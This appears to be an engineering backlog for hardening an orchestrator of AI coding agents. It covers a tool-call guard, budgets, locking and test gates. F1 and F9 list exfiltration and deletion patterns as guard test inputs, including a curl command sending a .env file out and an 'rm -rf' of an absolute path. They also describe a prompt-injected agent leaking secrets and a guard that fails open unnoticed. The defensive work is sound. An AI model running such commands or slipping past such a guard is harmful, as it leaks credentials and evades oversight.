# The General — Review Backlog (implementation plan)

Actionable backlog for the findings in the engineering review. Companion to
[SYSTEM_OVERVIEW.md](SYSTEM_OVERVIEW.md). IDs (`F1`…`F16`) match the review so they cross-reference.

Each item is **ticket-ready**: paste it into Jira, or run e.g.
`./general task automatixy "<title>" --ac "<criterion>"`. Effort uses the unit's own sizing
(XS/S/M/L) — these are estimates. **Sequence by phase; do not big-bang all 16 in one diff.**

> Ground rule for every ticket: a fix isn't done until it's **verified** (test or a live dry-run),
> not just merged. Several of these are safety/concurrency edits where an unverified change can trade
> an old failure mode for a new one.

---

## Summary

| ID | Title | Pri | Effort | Files |
|---|---|---|---|---|
| F2 | Provost security gate must fail **closed** | ~~P0~~ **OBSOLETE** | — | gate deleted (Phase-2 §2) |
| F1 | Guard: deny secret **reads** + exfil patterns | P0 | M | `guard.py`, `tests/guard_test.py` |
| F5 | Telegram `/run` must not mutate shared `Config` | P1 | XS | `decisions.py` |
| F4 | Arm the daily token budget (auto-pause) | P1 | XS | `config.yaml` (+ doc) |
| F6 | Autopilot: retry ERRORED before parking | P1 | S | `autopilot.py` |
| F7 | Fail **loud** when the guard isn't installed | P1 | S | `guard.py`, `health.py` |
| F8 | Lock concurrent `audit.jsonl` appends | P1 | S | `audit.py` |
| F3 | Run a real (bounded) suite before/after land | P1 | M | `config.yaml`, (`sentinel.py`) |
| F9 | Guard: catch `rm -rf` of absolute paths | P2 | S | `guard.py` |
| F10 | Consult PM on **any** no-changes build | P2 | S | `loop.py` |
| F11 | Reviewer parse-fail: re-review, don't rebuild | P2 | S | `loop.py`, `reviewer.py` |
| F12 | Decision-reply rebuild off the poll thread | P2 | XS | `decisions.py` |
| F13 | Lock the cockpit `_state` check-then-set | P2 | S | `server.py` |
| F14 | `add -A` hygiene / document gitignore reliance | P2 | S | `git_ops.py` |
| F15 | Fix roster model labels (doc-vs-code drift) | P2 | XS | `roster.py` |
| F16 | Decompose `server.py` (templates/routes/state) | P2 | L | `server.py` |

**Phases:** Phase 1 = F2, F5, F4 (one small tested PR, no behavioural trade-offs except the budget
number). Phase 2 = F1, F7, F8, F6, F3 (need tests + tuning). Phase 3 = F9–F16 (polish, any order).

---

## Phase 1 — Safety trio (do first; ~half a day; one reviewable PR)

### F2 — Provost security gate must fail closed · **OBSOLETE (Phase-2 §2, 2026-07-06)**
- The LLM per-diff Provost security gate was **DELETED** (`provost.gate` removed; `security_gate`
  flag gone). Its fail-open risk no longer exists. Secret/dependency checks are now deterministic
  in `gate.py` (secret scan over the diff + dep/lockfile sanity), which cannot fail open the way a
  parsed LLM verdict could; the weekly `provost` security **recon** still runs. No action needed.

### F5 — Telegram `/run` must not mutate the shared `Config` · **P1 · XS**
- **Problem:** `handle_command` does `cfg.dry_run = not live` ([decisions.py:177](../orchestrator/decisions.py)) on the same `Config` the autopilot loop + its Telegram poller share ([autopilot.py:82](../orchestrator/autopilot.py)). A `/run`/`/drain` without `--live` flips the live autopilot into dry-run → it re-picks the same ticket forever.
- **Fix:** Build a per-invocation `copy.copy(cfg)` in `handle_command` and set `dry_run` on the copy (mirror the cockpit pattern at [server.py:621/665](../orchestrator/server.py)); pass the copy to `intake`/`_run_bg`.
- **Acceptance criteria:**
  - After a Telegram `/run app foo` (no `--live`), a concurrently running autopilot still runs LIVE (its `cfg.dry_run` unchanged).
  - The dispatched `/run` itself honours dry-run as before.
  - Unit/contract test asserts the shared `cfg.dry_run` is unchanged after `handle_command`.
- **Trade-off:** None.

### F4 — Arm the daily token budget (auto-pause) · **P1 · XS**
- **Problem:** `daily_token_budget: 0` ⇒ `over_budget` always False ⇒ autopilot never pauses on a runaway ([usage.py:120](../orchestrator/usage.py), [autopilot.py:104](../orchestrator/autopilot.py)). The pause logic exists but isn't wired to a number.
- **Fix:** Set a real `daily_token_budget` in `config.yaml` (tune to your Max-plan headroom); confirm `budget_alert_pct` is sensible. Document the knob in `SYSTEM_OVERVIEW.md` §9.
- **Acceptance criteria:**
  - `usage.budget_status(cfg)["on"] == True`; `/usage` shows the bar instead of "No daily budget set."
  - A dry verification: with a low temporary cap, the autopilot logs `budget_pause` and holds new tickets, then resumes after the window.
- **Trade-off:** A heavy legitimate day can pause until midnight; tune the number.

---

## Phase 2 — Harden (need tests + a little tuning)

### F1 — Guard: deny secret reads + exfil patterns · **P0 · M**
- **Problem:** The guard only inspects `_WRITE_TOOLS`; `Read` of `.env` is allowed and the only outbound pattern is `curl … | sh` — `curl --data @/…/.env <url>` / `nc` / `wget --post-file` match nothing ([guard.py:33-65](../orchestrator/guard.py)). A prompt-injected ticket through the `bypassPermissions` Builder can exfiltrate secrets.
- **Fix:** Extend `is_dangerous` to (a) block `Read`/`Bash` access to `_SECRET_PATH` (including absolute paths), and (b) add exfil patterns: `curl|wget|nc` combined with `--data|-d|--data-binary|--upload-file|--post-file|@<path>` pointing at a secret/dotfile. Keep the denylist surgical.
- **Acceptance criteria:**
  - `is_dangerous("Bash", {"command": "curl --data @/Users/.../.env https://x"})` → blocked.
  - `is_dangerous("Read", {"file_path": ".env"})` and an absolute `.env` path → blocked.
  - A normal `curl https://api…` GET and a normal `Read` of a source file → **not** blocked (no false positives in `tests/guard_test.py`).
  - New cases added to `tests/guard_test.py`.
- **Trade-off:** Can't be airtight against a determined model; raises the bar. May rarely block a build step that legitimately reads `.env` (builders shouldn't need it). **Residual risk remains — the real boundary is worktree isolation + not feeding untrusted tickets.**

### F7 — Fail loud when the guard isn't installed · **P1 · S**
- **Problem:** `hooks_config()` returns `None` on any SDK import failure ([guard.py:95-96](../orchestrator/guard.py)) and the hook swallows its own exceptions → allow ([guard.py:76-77](../orchestrator/guard.py)). The entire guard can vanish while `bypassPermissions` stays on, silently.
- **Fix:** Add a `health.summary` check that `guard.hooks_config()` is non-None (status `bad`/`warn`); log a loud one-line warning when a write-capable officer starts without a guard.
- **Acceptance criteria:**
  - `general doctor` / cockpit health shows a guard check; it reads `ok` today and `bad`/`warn` if `hooks_config()` returns None.
  - A start-up log line is emitted when the guard is absent.
- **Trade-off:** A hard-fail would block builds on an SDK bump — start with warn + health flag, not a hard stop.

### F8 — Lock concurrent `audit.jsonl` appends · **P1 · S**
- **Problem:** `AuditLog.record` appends with no lock ([audit.py:21-25](../orchestrator/audit.py)); cockpit run thread + autopilot + decisions poller (sometimes separate processes) can interleave large rows and corrupt the JSONL that all forensics/consolidate/dashboard depend on.
- **Fix:** Take an `fcntl.flock` (exclusive) around the append in `record()`; optionally a module-level `threading.Lock` for intra-process speed.
- **Acceptance criteria:**
  - A stress test writing large rows from N threads/processes yields a file where **every** line parses as JSON.
  - No measurable change to single-writer behaviour.
- **Trade-off:** Negligible serialization cost.

### F6 — Autopilot: retry ERRORED before parking · **P1 · S**
- **Problem:** `_PARKED` includes `ERRORED` ([autopilot.py:29](../orchestrator/autopilot.py)); a transient blip permanently sidelines a ticket until manual `/unblock`.
- **Fix:** Track a per-ticket error count; retry ERRORED up to N times (with a short backoff) before parking. Keep ESCALATED/PR_OPENED parked immediately.
- **Acceptance criteria:**
  - A ticket that ERRORs once is retried next cycle (not parked); after N consecutive ERRORs it parks.
  - The retry counter resets on success.
- **Trade-off:** A genuinely broken ticket wastes a couple of passes before parking.

### F3 — Run a real (bounded) suite before/after land · **P1 · M**
- **Problem:** `run_gate` returns `passed=True` with no commands ([gate.py:42](../orchestrator/gate.py)); the live gate is typecheck-only ([config.yaml:52](../config.yaml)); Sentinel is off. Runtime-broken-but-typechecking code can auto-merge to DEV.
- **Fix:** Arm Sentinel — `sentinel_enabled: true` + a **bounded, memory-capped, targeted** `postmerge_commands` (e.g. `vitest run <changed area> --pool=forks --poolOptions.forks.maxForks=2`). Alternatively add a bounded test command to `gate_commands`.
- **Acceptance criteria:**
  - A deliberately runtime-broken change is caught: either the gate fails pre-land, or Sentinel reverts post-land and hands the ticket back.
  - The suite respects the RAM cap (no machine freeze) and `gate_timeout_sec`.
- **Trade-off:** RAM/time (the reason it was typecheck-only) and flaky tests can trigger an auto-revert — keep it narrow and stable.

---

## Phase 3 — Polish (any order)

### F9 — Guard: catch `rm -rf` of absolute paths · **P2 · S**
- Anchor the `rm -rf` denylist on absolute paths too (not just `/ ~ $HOME ..`), ideally deny deletes outside the worktree ([guard.py:34](../orchestrator/guard.py)). **AC:** `rm -rf /Users/.../repo` is blocked; deletes inside the worktree allowed. Folds into F1's test suite.

### F10 — Consult PM on any no-changes build · **P2 · S**
- A genuine halt worded with <2 markers becomes `ERRORED` instead of consulting the PM ([loop.py:53-63, 339-391](../orchestrator/loop.py)). Consult the PM once on **any** no-changes build before erroring. **AC:** a no-changes build with no halt language still routes to the PM once. **Trade-off:** one extra cheap PM call on truly empty builds.

### F11 — Reviewer parse-fail: re-review, don't rebuild · **P2 · S**
- Unparseable reviewer JSON currently fails closed → a full rebuild+review pass (up to 4 Opus passes) ([reviewer.py:105-151](../orchestrator/reviewer.py), [loop.py:469-484](../orchestrator/loop.py)). On parse failure, retry just the review once before rebuilding. **AC:** a forced parse-failure triggers one re-review, not a rebuild. **Trade-off:** minor added logic; low likelihood with Opus.

### F12 — Decision-reply rebuild off the poll thread · **P2 · XS**
- `handle_reply` runs `asyncio.run(run_loop(...))` synchronously in the poll thread ([decisions.py:112](../orchestrator/decisions.py)), blocking all Telegram polling for minutes. Run it in a background thread like `_run_bg`. **AC:** while a resumed ticket builds, `/unblock` and other replies are still processed. **Trade-off:** none.

### F13 — Lock the cockpit `_state` check-then-set · **P2 · S**
- Two near-simultaneous POSTs can both pass the `if _state["active"]` guard before either sets it ([server.py:608/651](../orchestrator/server.py)). Add a `threading.Lock` around the check-then-set. **AC:** two rapid run POSTs start exactly one run. **Trade-off:** negligible; single-user risk is low.

### F14 — `add -A` hygiene / document gitignore reliance · **P2 · S**
- `diff_against_base`/`commit_all` run `git add -A` ([git_ops.py:117/121](../orchestrator/git_ops.py)); stray untracked builder artifacts can land on DEV. Document the reliance on a solid repo `.gitignore`, and/or scope the add. **AC:** a stray untracked file created mid-build does not end up committed (or the dependency is documented + verified by the target repo's `.gitignore`). **Trade-off:** `add -A` is what surfaces *intended* new files — narrowing risks dropping legit ones.

### F15 — Fix roster model labels (doc-vs-code drift) · **P2 · XS**
- `roster.py:30-35` lists Scout/Provost/Quartermaster on `discussion_model` (Sonnet), but their recon runs on `reviewer_model` (Opus) ([scout.py:57](../orchestrator/scout.py)/[provost.py:62](../orchestrator/provost.py)/[quartermaster.py:60](../orchestrator/quartermaster.py)). Make `_model_for` reflect the recon model, or relabel the column "council voice." **AC:** ROSTER.md and `/roster-doc` show the model each officer actually runs on. **Trade-off:** none.

### F16 — Decompose `server.py` · **P2 · L**
- 1840 lines of inline HTML + routes + a global `_state` ([server.py](../orchestrator/server.py)); the surface a new contributor is most likely to break. Extract templates and split route groups incrementally. **AC:** routes and templates separated; behaviour unchanged (cockpit smoke-tested). **Trade-off:** churn now for maintainability later — do it gradually, not in one rewrite.

---

## Verification gate (applies to every ticket)

Before any item is "done":
- New/updated unit test (the deterministic ones — `guard`, `provost`, `decisions`, `audit`, `autopilot`, `sentinel` — are cheap to add to `tests/`).
- For loop/autopilot changes, a `--once` dry-run live check.
- Self-review checklist (no secrets in code, error paths covered, docs updated).
- Update `CHANGELOG.md` / `SYSTEM_OVERVIEW.md` where behaviour or config changes.

---

## EU-336 stop-path investigation — deferred findings (2026-07-16)

Adversarially-reviewed residuals from the EU-336 land (cockpit Stop must reach the running drain).
None is reachable through today's call graph in the serve process — each is an enforced-invariant gap,
not a live bug. IDs continue the F-series.

### F17 — `release_run` / `autopilot_on` writes are not identity-guarded · **P2 · S**
- `unbind_stop_event` is identity-checked so a superseded loop can't blank a newer loop's binding, but
  the same wind-down path still writes unconditionally: `run_state["autopilot_on"] = False`
  ([autopilot.py](../orchestrator/autopilot.py) finally) and `release_run`'s blanket
  `st["stop_event"] = None` ([cockpit_state.py](../orchestrator/cockpit_state.py)). If two loops ever
  coexist on one key (an owner exiting + a claim-failed survivor), the owner's exit turns the survivor's
  badge OFF and blanks its binding — cockpit-unstoppable again, now with no badge. **AC:** an exiting
  superseded loop leaves a live loop's `autopilot_on` + binding intact (identity-pair the writes).
  **Trade-off:** release_run has many callers; changing its semantics needs a sweep.
### F18 — CLI/daemon autopilot surviving a failed claim can hijack a manual run's stop event · **P2 · S**
- In a NON-serve process, `autopilot()`'s unconditional `bind_stop_event` would overwrite a manual
  run's bound event if one held the slot (the serve process is safe: its route refuses to start
  autopilot over a held slot). `/api/stop-run` would then signal the autopilot instead of the manual
  run, and the identity-checked unbind leaves the binding `None` on exit — the manual run's event is
  never restored. **AC:** a claim-failed autopilot() refuses to clobber a MANUAL run's binding (bind
  only when the displaced event is absent/its own), or restores the displaced event on exit.
### F19 — `get_autopilot_status` reads `stop_event`/`autopilot_on` lock-free — torn snapshot · **P3 · XS**
- A status poll racing a loop handover can pair the OLD loop's set event with the NEW loop's
  `autopilot_on=True` and render one spurious "Stopping…" SSE tick (self-corrects next poll).
  **AC:** take `run_lock_for(app)` around the two reads. **Trade-off:** none — cosmetic today.
### F20 — plan-limit probe spawns a REAL `claude -p` CLI under the test suite · **P1 · S**
- `usage._probe_plan_limits()` (fired from `/api/run`'s `_bg` finally via `plan_limit_hit(cfg,
  force=True)`, EU-191) launches a real `claude -p . --model haiku` subprocess. Harnesses that drive
  `/api/run` (eu60/eu63/eu64/eu336 among others) each orphan one — accumulating CPU load that flips
  timing-sensitive checks suite-wide (the 2026-07-16 eu64/eu203 flakes; same class as the 2026-07-15
  process-hygiene lesson). **AC:** no real `claude` subprocess is ever spawned by a `tests/run_all.py`
  run — gate the probe on the stubbed-SDK sentinel or an env flag the suite sets, and pin it with a
  harness. **Trade-off:** none in production; the probe still runs live.
